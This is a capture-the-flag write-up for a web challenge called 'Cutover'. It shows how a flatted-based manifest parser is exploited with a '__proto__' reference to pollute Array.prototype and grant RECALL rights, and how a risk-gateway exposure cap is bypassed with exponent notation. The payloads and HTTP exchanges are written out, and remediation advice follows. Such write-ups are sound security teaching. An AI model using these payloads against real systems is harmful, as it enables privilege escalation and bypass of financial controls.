### Cutover

> Web · Hard · Mohamed Amine Mzoughi
> Points at solve: [fill in]

**Tools used**

Not specified.

**Approach**

Target: http://<instance>/

Three weaknesses chained:

1. Recon. `GET /api/v1/schema` published the tier table (OPERATOR has only READ,QUEUE; RECALL needs SUPERVISOR), the flatted 3.4.1 manifest wire format, the recall unlock (`sha256-hex` of `cutover|<batch id>|<settled aggregate>`), and the risk gateway note:

```json
"risk_gateway": {
  "screens": "integer minor units",
  "number_grammar": "RFC 8259 section 6",
  "exposure_cap_minor": 29000000,
  "on_undetermined": "defer_downstream",
  "note": "the gateway applies the rail-level exposure cap; the cap is not lifted by tier"
}
```

The console served the engine source at `/source/engine-src.tar.gz` (same build, only the release authorization's env-var name differs from the handout). The relevant code: `src/tiers.js`, `src/intake.js`, `vendor/flatted/index.cjs`.

2. Finding the hostile batch. Eleven batches are queued. Cross-checking the three sources named in the schema ("the batch that reconciles as adversarial across the register, the manifests and the settlement journal"):

| batch | originator | declared | settled (sum) | journal max | register max |
|---|---|---|---|---|---|
| **MRN-7C81FF** | ALMCXZ2LXXX | 34,600,000 | **37,700,000** | 12,900,000 | 17,900,000 |
| MRN-A1085F | HVLTXZ2LXXX | 21,700,000 | 17,300,000 | 17,800,000 | 20,500,000 |
| MRN-965665 | DLPHXZ2LXXX | 13,300,000 | 11,500,000 | 13,100,000 | 14,900,000 |
| others | — | = sum | = sum | within profile | within profile |

`MRN-7C81FF` is the only batch that is adversarial on every axis:

- its instructions settle to `16,992,295 + 20,707,705 = 37,700,000`, the only aggregate above the 29,000,000 rail exposure cap;
- its declared aggregate `34,600,000` **understates** the settlement by `3,100,000` (the other two mismatches over-declare, which hides nothing);
- ALMC's journal history (12 sweeps, median 11.1M, max 12.9M) and register history (max 17.9M) put 37.7M at ~2.9× its historical maximum.

So the Glass Tide plant is `MRN-7C81FF`, settled aggregate **37700000**, and the recall value the engine wants is exactly that number.

3. OPERATOR → RECALL via flatted prototype pollution. `src/tiers.js` keeps each row's grants in an **array** used as a lookup table:

```js
function container(actions) { const grants = []; for (const a of actions) grants[a] = true; return grants; }
function permitted(table, session, action) { return grantsFor(table, session)[action] === true; }
```

`grants["RECALL"]` is not an own property of the OPERATOR array, so the lookup walks `Array.prototype` → `Object.prototype`. Poison either and the check passes.

`src/intake.js` merges attacker data into a `basis` object:

```js
const basis = manifest.basis ?? {};
merge(basis, ROUTING_DEFAULTS);
merge(basis, manifest.hints ?? {});
```

The flatted parser resolves every nested string as a **reference into the flat array**: `const tmp = input[value]`. It does not require the reference to be a numeric index. The manifest arrives from `JSON.parse(body, ...)` first, so the string `"__proto__"` is a real value, and `input["__proto__"]` hits the inherited accessor and returns **`Array.prototype`**.

So a manifest with `"basis":"__proto__"` makes `basis === Array.prototype`, and `merge(basis, hints)` writes the attacker's hints straight onto `Array.prototype`. Payload posted as `text/plain` to `/api/v1/manifests`:

```
[{"batch":"1","originator":"2","valueDate":"3","declaredAggregateMinor":1,
  "instructions":"4","basis":"__proto__","hints":"7"},
 "MRN-PP-77","ALMCXZ2LXXX","2026-11-06",
 ["5"],{"counterparty":"6","amountMinor":1},"MCSA/LIQ",{"RECALL":true}]
```

(`"1"`…`"7"` are flatted references to the other array entries; `"__proto__"` is resolved as a property of the flat array itself.)

The engine answers `201 Created` and subsequently `permitted(..., "RECALL")` returns `true` for every session in the process. Note that `normalise()` runs **before** `validate()`, so even a manifest that is later rejected as invalid pollutes the process — the first local test proved that with a 400 response immediately followed by a passing tier check.

Confirmation on the live rail: a recall for a nonexistent batch now returns `404 batch.not_found` (past the tier gate) instead of `403 tier.insufficient`.

4. Getting the over-cap value past the risk gateway. The gateway screens numbers against the exposure cap:

```
POST {"type":"RECALL","batch":"NOPE","value":37700000}
→ 422 {"capMinor":29000000,"error":"exposure.cap_exceeded"}   (X-Screening: reject)
```

The advertised number grammar is RFC 8259 §6, which permits exponent and fraction forms, but the gateway only resolves plain integer minor units. Any other form is "undetermined" and `defer_downstream` forwards it:

```
POST {"type":"RECALL","batch":"NOPE","value":3.77e7}
→ 404 batch.not_found                                         (X-Screening: defer)
```

The engine's `JSON.parse` evaluates `3.77e7` to exactly `37700000`, so the `instruction.value !== settled` comparison still matches.

5. Recall and receipt.

```
unlock = sha256("cutover|MRN-7C81FF|37700000")
       = <redacted>
```

```json
{"type":"RECALL","batch":"MRN-7C81FF","value":3.77e7,
 "unlock":"<redacted>"}
```

Response `200 OK`:

```json
{"receipt":{"id":"RCPT-907A6F4C0E3E","at":"2026-11-06T15:52:17.721Z",
 "type":"RECALL","batch":"MRN-7C81FF","value":37700000,"screening":"defer",
 "settledAggregateMinor":37700000,"operator":"OPERATOR",
 "authorization":"CSCTF{REDACTED}"}}
```

The receipt's `operator` still says `OPERATOR`: the escalation was never a role change, only a poisoned prototype lookup.

**Why it works**

- Flatted's reference resolution accepts non-numeric, inherited keys: `input["__proto__"]` returns `Array.prototype`, so attacker-controlled `hints` (`{"RECALL":true}`) are merged straight onto `Array.prototype`. Tier grants are stored as string-keyed **arrays**, and `permitted()` does `grantsFor(table, session)[action] === true` with no own-property check, so `grants["RECALL"]` resolves to `true` through the prototype chain for every session.
- `normalise()` runs **before** `validate()`, so pollution happens even for manifests later rejected as invalid.
- The risk gateway implements only a subset of RFC 8259 §6 (plain integer minor units); any other grammar form is classified "undetermined" and `defer_downstream` forwards it downstream, while the engine's `JSON.parse` normalises `3.77e7` to exactly `37700000`, so the `instruction.value !== settled` comparison still matches.

Remediation (brief):

- flatted reference resolution must accept only own numeric indices of the flat array; reject `__proto__`, `constructor` and other inherited keys.
- `merge()` should copy into a null-prototype object against an allow-list, and must never be callable with a shared prototype object as its target.
- Grants containers should be `Map`s or null-prototype objects, not arrays; a lookup must not walk `Array.prototype`.
- `normalise()` must not touch shared state before validation succeeds.
- Risk screening must parse the full number grammar, normalise the value, and fail closed (reject) on "undetermined" — `defer_downstream` is a bypass.
- Authorization (SUPERVISOR check) must be an authenticated role decision, not a prototype-chain property lookup.

**Validation**

A recall for a nonexistent batch returned `404 batch.not_found` (past the tier gate) instead of `403 tier.insufficient`, confirming the prototype pollution. The final recall for `MRN-7C81FF` returned `200 OK` with a receipt carrying the release authorization (flag `CSCTF{REDACTED}`); the receipt shows `screening: defer`, `settledAggregateMinor: 37700000`, and `operator: OPERATOR`, confirming the escalation was a poisoned prototype lookup rather than a role change.
